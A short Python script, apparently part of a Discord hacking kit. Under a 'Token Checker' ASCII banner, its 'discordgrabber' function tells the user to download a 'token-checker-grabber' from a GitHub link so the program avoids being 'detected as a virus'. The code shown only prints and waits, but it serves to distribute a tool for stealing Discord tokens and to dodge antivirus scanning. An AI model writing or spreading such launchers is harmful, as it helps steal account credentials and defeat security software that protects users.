import time
import os
from datetime import date
from random import randint
from colorama import Fore, Style, init

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

today = date.today()
  
def clearcmd():
    os.system('cls' if os.name == 'nt' else 'clear')

def discordgrabber():
  print(bcolors.OKBLUE + "Today's date:",today)
  print(bcolors.OKBLUE + """                      
___________     __                   _________ .__                   __                 
\__    ___/___ |  | __ ____   ____   \_   ___ \|  |__   ____   ____ |  | __ ___________ 
  |    | /  _ \|  |/ // __ \ /    \  /    \  \/|  |  \_/ __ \_/ ___\|  |/ // __ \_  __ 
  |    |(  <_> )    <\  ___/|   |  \ \     \___|   Y  \  ___/\  \___|    <\  ___/|  | \/
  |____| \____/|__|_ \\___  >___|  /  \______  /___|  /\___  >\___  >__|_ \\___  >__|   
                    \/    \/     \/          \/     \/     \/     \/     \/    \/       

              Download                                                                 
        """)
  print(bcolors.OKBLUE + """
    You need to download the file, since we don't want this program to get detected as a virus.
    https://github.com/itsk0ntra/token-checker-grabber
    """)
  time.sleep(10.00)
discordgrabber()
